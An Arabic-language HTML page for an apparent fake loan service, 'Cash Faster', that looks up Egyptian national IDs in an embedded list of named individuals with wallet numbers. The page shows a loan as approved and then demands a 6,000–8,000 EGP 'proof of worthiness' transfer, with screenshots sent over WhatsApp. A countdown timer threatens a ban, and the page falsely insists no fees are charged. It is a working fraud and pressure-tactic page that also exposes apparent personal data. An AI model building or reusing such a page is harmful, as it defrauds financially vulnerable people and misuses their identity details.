<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>المرحلة الاخيرة | إثبات الجدارة لصرف القرض</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root { --emerald: #2ECC71; --emerald-dark: #27AE60; --emerald-glow: rgba(46,204,113,0.4); --deep-blue: #0F172A; --deep-blue-light: #1E293B; --royal-gold: #D4AF37; --royal-gold-light: #F3D572; --neon-purple: #B85CFF; --text-light: #F8FAFC; --text-muted: #94A3B8; --danger: #EF4444; --warning: #FF8C42; --glass-bg: rgba(15,23,42,0.75); --glass-border: rgba(255,255,255,0.1); }
        body { font-family: 'Cairo', sans-serif; background: radial-gradient(circle at 30% 10%, #0F172A, #020617); color: var(--text-light); min-height: 100vh; position: relative; overflow-x: hidden; }
        .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; background-image: linear-gradient(rgba(46,204,113,0.06) 1px, transparent 1px), linear-gradient(90deg, rgba(46,204,113,0.06) 1px, transparent 1px); background-size: 50px 50px; pointer-events: none; animation: gridMove 20s linear infinite; }
        @keyframes gridMove { 0% { transform: translate(0,0); } 100% { transform: translate(50px,50px); } }
        .bg-glow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(ellipse at 30% 40%, rgba(46,204,113,0.08) 0%, transparent 60%); pointer-events: none; z-index: 0; }
        .container { position: relative; z-index: 2; max-width: 500px; margin: 0 auto; padding: 1.2rem; }
        .glass-header { background: rgba(15,23,42,0.6); backdrop-filter: blur(16px); border-radius: 2rem; padding: 0.8rem 1.8rem; margin-bottom: 2rem; border: 1px solid var(--glass-border); box-shadow: 0 8px 20px rgba(0,0,0,0.3); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; }
        .logo h1 { font-size: 1.8rem; font-weight: 900; background: linear-gradient(135deg, #FFF, var(--emerald), var(--royal-gold)); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .logo p { font-size: 0.7rem; color: var(--royal-gold); }
        .hero-badge { background: rgba(46,204,113,0.2); border: 1px solid var(--emerald); border-radius: 2rem; padding: 0.4rem 1.2rem; font-size: 0.85rem; font-weight: 600; }
        .hero-badge i { color: var(--emerald); }

        .search-card { background: var(--glass-bg); backdrop-filter: blur(20px); border-radius: 2rem; padding: 2rem; margin-bottom: 2rem; border: 1px solid rgba(46,204,113,0.3); box-shadow: 0 20px 30px -15px rgba(0,0,0,0.4); text-align: center; }
        .search-card h3 { font-size: 1.5rem; font-weight: 700; color: var(--emerald); margin-bottom: 0.5rem; }
        .search-card p { color: var(--text-muted); margin-bottom: 1.2rem; }
        .input-group { max-width: 480px; margin: 0 auto; }
        .input-group input { width: 100%; padding: 1rem 1.5rem; background: rgba(0,0,0,0.7); border: 2px solid var(--emerald); border-radius: 3rem; color: white; font-size: 1rem; text-align: center; transition: all 0.2s; }
        .input-group input:focus { outline: none; border-color: var(--royal-gold); box-shadow: 0 0 20px var(--emerald-glow); }
        .btn-primary { background: linear-gradient(105deg, var(--emerald), var(--emerald-dark)); border: none; padding: 0.9rem 1.8rem; border-radius: 3rem; font-weight: 800; font-size: 1rem; margin-top: 1.2rem; width: 100%; max-width: 280px; cursor: pointer; transition: 0.2s; color: #0F172A; box-shadow: 0 4px 12px rgba(46,204,113,0.4); display: inline-flex; align-items: center; justify-content: center; gap: 0.6rem; }
        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(46,204,113,0.6); }

        .payment-card { background: var(--glass-bg); backdrop-filter: blur(20px); border-radius: 2rem; padding: 1.8rem; margin-bottom: 1.5rem; border: 1px solid rgba(255,255,255,0.08); animation: fadeSlideUp 0.5s ease; }
        @keyframes fadeSlideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        .payment-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px dashed rgba(255,255,255,0.1); padding-bottom: 0.8rem; margin-bottom: 1rem; }
        .payment-header .title { font-size: 0.85rem; color: var(--text-muted); font-weight: 500; }
        .payment-header .badge { background: rgba(46,204,113,0.12); border: 1px solid rgba(46,204,113,0.2); border-radius: 2rem; padding: 0.2rem 0.8rem; font-size: 0.65rem; color: var(--emerald); }

        .amount-display { text-align: center; padding: 0.5rem 0; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 1rem; }
        .amount-display .label { font-size: 0.7rem; color: var(--text-muted); }
        .amount-display .value { font-size: 2.8rem; font-weight: 800; color: #FFF; letter-spacing: 1px; }
        .amount-display .currency { font-size: 0.9rem; color: var(--text-muted); }

        .payment-details { background: rgba(0,0,0,0.2); border-radius: 1rem; padding: 1rem; margin: 1rem 0; }
        .payment-details .row { display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid rgba(255,255,255,0.04); font-size: 0.85rem; }
        .payment-details .row:last-child { border-bottom: none; }
        .payment-details .row .key { color: var(--text-muted); font-weight: 400; }
        .payment-details .row .value { font-weight: 600; color: #FFF; }
        .payment-details .row .value.gold { color: var(--royal-gold); }
        .payment-details .row .value.danger { color: var(--danger); }

        .glow-amount { text-align: center; padding: 1.2rem; margin: 1rem 0; background: radial-gradient(circle, rgba(212,175,55,0.1), transparent 70%); border-radius: 1.5rem; border: 1px solid var(--royal-gold); animation: pulseGold 1.5s infinite alternate; }
        @keyframes pulseGold { 0% { box-shadow: 0 0 5px rgba(212,175,55,0.2); } 100% { box-shadow: 0 0 25px rgba(212,175,55,0.4); } }
        .glow-amount .label { font-size: 0.75rem; color: var(--text-muted); }
        .glow-amount .amount { font-size: 2.8rem; font-weight: 900; color: var(--royal-gold); text-shadow: 0 0 20px rgba(212,175,55,0.3); }

        .danger-box { background: radial-gradient(circle, rgba(239,68,68,0.15), transparent 70%); border: 2px solid var(--danger); border-radius: 1.5rem; padding: 1.2rem; margin: 1rem 0; animation: pulseRed 1.2s infinite alternate; }
        @keyframes pulseRed { 0% { box-shadow: 0 0 5px rgba(239,68,68,0.2); } 100% { box-shadow: 0 0 25px rgba(239,68,68,0.4); } }
        .danger-box .label { font-size: 0.75rem; color: var(--text-muted); }
        .danger-box .amount { font-size: 2.8rem; font-weight: 900; color: var(--danger); text-shadow: 0 0 20px rgba(239,68,68,0.3); }

        .info-box { background: rgba(255,255,255,0.02); border-right: 3px solid var(--royal-gold); padding: 0.8rem; border-radius: 0.8rem; margin: 0.8rem 0; font-size: 0.8rem; color: var(--text-muted); line-height: 1.8; }
        .info-box .highlight { color: var(--royal-gold); font-weight: 700; }
        .info-box .highlight-danger { color: var(--danger); font-weight: 700; }

        .steps-box { background: rgba(255,255,255,0.02); border-radius: 0.8rem; padding: 0.8rem; margin: 0.8rem 0; border: 1px solid rgba(255,255,255,0.04); }
        .steps-box .step { display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; font-size: 0.8rem; color: var(--text-muted); border-bottom: 1px solid rgba(255,255,255,0.03); }
        .steps-box .step:last-child { border-bottom: none; }
        .steps-box .step .num { min-width: 24px; height: 24px; border-radius: 50%; background: var(--royal-gold); color: #0F172A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .steps-box .step .text strong { color: #FFF; }

        .timer-glow { background: radial-gradient(circle, rgba(212,175,55,0.08), transparent); border: 1px solid var(--royal-gold); border-radius: 1.5rem; text-align: center; padding: 0.8rem; margin: 0.8rem 0; animation: pulseGold 1.2s infinite alternate; }
        .timer-danger { background: radial-gradient(circle, rgba(239,68,68,0.12), transparent); border: 2px solid var(--danger); border-radius: 1.5rem; text-align: center; padding: 0.8rem; margin: 0.8rem 0; animation: pulseRed 1.2s infinite alternate; }
        .timer { font-family: monospace; font-size: 2rem; font-weight: 800; background: #00000088; display: inline-block; padding: 0.2rem 0.8rem; border-radius: 1.5rem; color: var(--royal-gold); letter-spacing: 3px; }
        .timer-danger .timer { color: var(--danger); }

        .btn-whatsapp { background: linear-gradient(135deg, #25D366, #128C7E); padding: 0.8rem; border-radius: 3rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; font-weight: 700; font-size: 1rem; border: none; color: white; cursor: pointer; transition: 0.2s; width: 100%; margin-top: 0.8rem; box-shadow: 0 4px 15px rgba(37,211,102,0.25); }
        .btn-whatsapp:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(37,211,102,0.4); }
        .btn-pay { background: linear-gradient(135deg, var(--royal-gold), #B8960F); color: #0F172A; box-shadow: 0 4px 15px rgba(212,175,55,0.25); }
        .btn-pay:hover { box-shadow: 0 0 20px rgba(212,175,55,0.4); }
        .btn-danger { background: linear-gradient(135deg, var(--danger), #C0392B); color: white; box-shadow: 0 4px 15px rgba(239,68,68,0.25); }
        .btn-danger:hover { box-shadow: 0 0 20px rgba(239,68,68,0.4); }

        .error-card { background: rgba(239,68,68,0.12); border: 1px solid var(--danger); border-radius: 1.5rem; padding: 1.5rem; text-align: center; display: none; margin-top: 1rem; }
        .loader { text-align: center; display: none; margin: 1rem; }
        .footer { text-align: center; margin-top: 1.5rem; font-size: 0.65rem; color: var(--text-muted); }

        @media (max-width: 640px) {
            .glass-header { flex-direction: column; text-align: center; }
            .amount-display .value { font-size: 2rem; }
            .glow-amount .amount { font-size: 2rem; }
            .danger-box .amount { font-size: 2rem; }
            .payment-details .row { font-size: 0.75rem; flex-wrap: wrap; gap: 0.2rem; }
            .timer { font-size: 1.5rem; }
        }
    </style>
</head>
<body>
<div class="bg-particles"></div>
<div class="bg-glow"></div>

<div class="container">
    <div class="glass-header">
        <div class="logo">
            <h1>⚡ Cash Faster</h1>
            <p><i class="fas fa-bolt"></i> إثبات الجدارة لصرف القرض</p>
        </div>
        <div class="hero-badge">
            <i class="fas fa-check-circle"></i> سيتم صرف القرض بعد الإثبات
        </div>
    </div>

    <div class="search-card">
        <h3><i class="fas fa-id-card"></i> استعلم عن طلبك</h3>
        <p>أدخل رقم بطاقتك القومية (14 رقم) لإتمام إجراءات إثبات الجدارة</p>
        <div class="input-group">
            <input type="text" id="nationalId" placeholder="مثال: 26707092100701" maxlength="14" inputmode="numeric">
            <button class="btn-primary" onclick="searchCustomer()"><i class="fas fa-search"></i> استعلام</button>
        </div>
        <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse fa-2x"></i> جاري التحقق...</div>
    </div>

    <div id="resultSection"></div>
    <div id="errorCard" class="error-card"><i class="fas fa-exclamation-triangle"></i> الرقم القومي غير مسجل. تواصل مع الدعم.</div>
    <div class="footer"><i class="fas fa-shield-alt"></i> جميع البيانات مشفرة | إثبات الجدارة لا يتطلب دفع أي أموال للشركة</div>
</div>

<script>
const WHATSAPP_NUMBER = "212631288235";
const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
let currentCustomer = null;
let currentNationalId = null;
let timerInterval = null;
let fineTimerInterval = null;

function openWhatsApp(customMessage) {
    let msg = customMessage || `📤 إرسال إثبات الجدارة\nالعميل: ${currentCustomer ? currentCustomer.name : ''}\nالرقم القومي: ${currentNationalId || ''}\nنوع المحفظة: ${currentCustomer ? currentCustomer.wallet : ''}\nرقم المحفظة: ${currentCustomer ? currentCustomer.walletNum || "غير مسجل" : ''}\nالمبلغ المطلوب صرفه: ${currentCustomer ? currentCustomer.loan.toLocaleString('ar-EG') : ''} ج.م\n\nسأقوم بإرسال صور إثبات الجدارة (دخول وخروج) لإتمام الصرف.`;
    window.open(`${WHATSAPP_URL}?text=${encodeURIComponent(msg)}`, '_blank');
}

// ===== قاعدة بيانات العملاء الجدد =====
const customersDatabase = {
    // ===== العملاء الجدد =====
    "28501010105859": { name: "هيثم مجدى احمد شفيق", loan: 30000, wallet: "سيتم فتح محفظة اتصالات كاش", walletNum: "01023818604", status: "pending" },
    "30307072100878": { name: "محمد علاء الدين محمد", loan: 40000, wallet: "اتصالات كاش", walletNum: "01108665748", status: "approved" }
};

// ===== دالة عرض صفحة إثبات الجدارة العادية =====
function buildProofPage(customer, nationalId, isUrgent = false, deadlineMinutes = 30) {
    const proofAmount = customer.loan < 100000 ? 6000 : 8000;
    const proofAmountDisplay = proofAmount.toLocaleString('ar-EG');
    const loanDisplay = customer.loan.toLocaleString('ar-EG');
    const now = new Date();
    const refNum = Math.floor(Math.random() * 1e9);

    const startTimeKey = `startTime_${nationalId}`;
    const totalSeconds = deadlineMinutes * 60;

    const html = `
        <div class="payment-card">
            <div class="payment-header">
                <span class="title">المبلغ المستحق صرفه لحسابك</span>
                <span class="badge"><i class="fas fa-clock"></i> صرف فوري</span>
            </div>

            <div class="amount-display">
                <div class="label">المبلغ المدفوع لحسابك</div>
                <div class="value">${loanDisplay}</div>
                <div class="currency">ج.م</div>
            </div>

            <div class="payment-details">
                <div class="row">
                    <span class="key"><i class="fas fa-user"></i> اسم العميل</span>
                    <span class="value">${customer.name}</span>
                </div>
                <div class="row">
                    <span class="key"><i class="fas fa-wallet"></i> طريقة الصرف</span>
                    <span class="value gold">${customer.wallet}</span>
                </div>
                <div class="row">
                    <span class="key"><i class="fas fa-hashtag"></i> رقم المحفظة</span>
                    <span class="value gold">${customer.walletNum || "غير مسجل"}</span>
                </div>
                <div class="row">
                    <span class="key"><i class="fas fa-calendar"></i> التاريخ والوقت</span>
                    <span class="value">${now.toLocaleDateString('ar-EG')} - ${now.toLocaleTimeString('ar-EG')}</span>
                </div>
                <div class="row">
                    <span class="key"><i class="fas fa-hashtag"></i> رقم العملية</span>
                    <span class="value">${refNum}</span>
                </div>
            </div>

            <div class="glow-amount">
                <div class="label">💰 المبلغ المطلوب لإثبات الجدارة</div>
                <div class="amount">${proofAmountDisplay} <span style="font-size:1.5rem;">ج.م</span></div>
                <div style="font-size:0.7rem; color: var(--text-muted);">(هذا المبلغ ليس للشركة، بل لإثبات الجدية فقط)</div>
            </div>

            <div class="info-box">
                <i class="fas fa-info-circle" style="color: var(--royal-gold);"></i>
                <strong>📌 ما هو إثبات الجدارة؟</strong><br>
                هو إجراء أمني بسيط لتأكيد ملكية المحفظة. <span class="highlight">لن تقوم بتحويل أي أموال للشركة</span>، فقط دورة إيداع من شخص موثوق وإعادته لإثبات نشاط الحساب.
            </div>

            <div class="steps-box">
                <div class="step">
                    <div class="num">1</div>
                    <div class="text"><strong>📥 استلام المبلغ</strong><br>اطلب من شخص تثق فيه تحويل <span style="color: var(--royal-gold); font-weight: 700;">${proofAmountDisplay} ج.م</span> إلى محفظتك.</div>
                </div>
                <div class="step">
                    <div class="num">2</div>
                    <div class="text"><strong>📱 تصوير الرصيد</strong><br>التقط صورة شاشة (سكرين شوت) واضحة تظهر المبلغ في حسابك.</div>
                </div>
                <div class="step">
                    <div class="num">3</div>
                    <div class="text"><strong>🔄 إعادة المبلغ</strong><br>قم بتحويل نفس المبلغ مرة أخرى لأي شخص.</div>
                </div>
                <div class="step">
                    <div class="num">4</div>
                    <div class="text"><strong>📸 تصوير التحويل</strong><br>التقط صورة شاشة لإشعار خروج المبلغ من حسابك.</div>
                </div>
                <div class="step">
                    <div class="num">5</div>
                    <div class="text"><strong>📤 إرسال الصور للدعم</strong><br>أرسل صورتي الإيداع والتحويل عبر واتساب باستخدام الزر أدناه.</div>
                </div>
            </div>

            <div class="info-box" style="border-right-color: var(--emerald);">
                <i class="fas fa-shield-alt" style="color: var(--emerald);"></i>
                <strong style="color: var(--emerald);">🔒 أمان وخصوصية تامة</strong><br>
                جميع بياناتك وصورك مشفرة 256-bit، ولا يطلع عليها أي شخص خارج فريق التمويل.
            </div>

            <div class="timer-glow">
                <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإثبات الجدارة</div>
                <div class="timer" id="proofTimer">${String(deadlineMinutes).padStart(2,'0')}:00</div>
                <div style="font-size:0.65rem;">⏳ يجب إكمال الإثبات قبل انتهاء الوقت لضمان الصرف الفوري</div>
            </div>

            <button class="btn-whatsapp btn-pay" id="transferBtn">
                <i class="fas fa-exchange-alt"></i> حول لي القرض الآن
            </button>

            <div style="margin-top: 0.6rem; text-align: center; font-size: 0.65rem; color: var(--text-muted);">
                <i class="fas fa-lock"></i> هذه العملية آمنة ومشفرة | لا توجد أي رسوم مطلوبة
            </div>
        </div>
    `;

    document.getElementById('resultSection').innerHTML = html;
    document.getElementById('errorCard').style.display = 'none';

    // ===== إدارة المؤقت =====
    if (timerInterval) clearInterval(timerInterval);
    let startTime = localStorage.getItem(startTimeKey);
    let nowTime = Date.now();
    let remainingSeconds = totalSeconds;

    if (startTime) {
        const elapsed = Math.floor((nowTime - parseInt(startTime)) / 1000);
        remainingSeconds = Math.max(0, totalSeconds - elapsed);
        if (remainingSeconds <= 0) {
            localStorage.removeItem(startTimeKey);
            document.getElementById('resultSection').innerHTML = `
                <div class="payment-card" style="border-color: var(--danger);">
                    <i class="fas fa-ban" style="font-size:3rem; color:var(--danger);"></i>
                    <h2 style="color:var(--danger);">❌ تم شطب طلبك</h2>
                    <p>لم تقم بإثبات الجدارة في الوقت المحدد.</p>
                    <button class="btn-whatsapp" id="contactSupportAfterBlock">التواصل مع الدعم</button>
                </div>
            `;
            const btn = document.getElementById('contactSupportAfterBlock');
            if (btn) btn.onclick = () => openWhatsApp(`طلب تم شطبه: ${customer.name}\nالرقم القومي: ${nationalId}`);
            return;
        }
    } else {
        startTime = nowTime;
        localStorage.setItem(startTimeKey, startTime.toString());
    }

    const timerEl = document.getElementById('proofTimer');
    let currentSeconds = remainingSeconds;
    const mins = Math.floor(currentSeconds / 60);
    const secs = currentSeconds % 60;
    timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;

    timerInterval = setInterval(() => {
        if (currentSeconds <= 0) {
            clearInterval(timerInterval);
            localStorage.removeItem(startTimeKey);
            document.getElementById('resultSection').innerHTML = `
                <div class="payment-card" style="border-color: var(--danger);">
                    <i class="fas fa-ban" style="font-size:3rem; color:var(--danger);"></i>
                    <h2 style="color:var(--danger);">❌ تم شطب طلبك وحظرك لمدة 90 يوماً</h2>
                    <p>لم تقم بإثبات الجدارة في الوقت المحدد.</p>
                    <button class="btn-whatsapp" id="contactSupportAfterBlock">التواصل مع الدعم</button>
                </div>
            `;
            const btn = document.getElementById('contactSupportAfterBlock');
            if (btn) btn.onclick = () => openWhatsApp(`طلب تم شطبه وحظر 90 يومًا: ${customer.name}\nالرقم القومي: ${nationalId}`);
        } else {
            currentSeconds--;
            const mins = Math.floor(currentSeconds / 60);
            const secs = currentSeconds % 60;
            timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        }
    }, 1000);

    // ===== ربط زر التحويل =====
    const transferBtn = document.getElementById('transferBtn');
    if (transferBtn) {
        transferBtn.onclick = () => {
            const proofAmountDisplay = (customer.loan < 100000 ? 6000 : 8000).toLocaleString('ar-EG');
            let msg = `📤 إرسال إثبات الجدارة\n`;
            msg += `العميل: ${customer.name}\n`;
            msg += `الرقم القومي: ${nationalId}\n`;
            msg += `نوع المحفظة: ${customer.wallet}\n`;
            msg += `رقم المحفظة: ${customer.walletNum || "غير مسجل"}\n`;
            msg += `المبلغ المطلوب صرفه: ${customer.loan.toLocaleString('ar-EG')} ج.م\n`;
            msg += `مبلغ الإثبات: ${proofAmountDisplay} ج.م\n\n`;
            msg += `سأقوم بإرسال صور إثبات الجدارة (دخول وخروج) لإتمام الصرف فوراً.`;
            openWhatsApp(msg);
        };
    }
}

// ===== البحث الرئيسي =====
function searchCustomer() {
    const nationalId = document.getElementById('nationalId').value.trim();
    if (!nationalId) { alert('الرجاء إدخال الرقم القومي'); return; }
    if (nationalId.length !== 14) { alert('الرقم القومي 14 رقم'); return; }
    document.getElementById('loader').style.display = 'block';
    setTimeout(() => {
        document.getElementById('loader').style.display = 'none';
        const customer = customersDatabase[nationalId];
        if (!customer) {
            document.getElementById('resultSection').innerHTML = '';
            document.getElementById('errorCard').style.display = 'block';
            return;
        }
        currentCustomer = customer;
        currentNationalId = nationalId;
        document.getElementById('errorCard').style.display = 'none';

        buildProofPage(customer, nationalId, false, 30);
    }, 800);
}

window.searchCustomer = searchCustomer;
document.getElementById('nationalId')?.addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
</script>
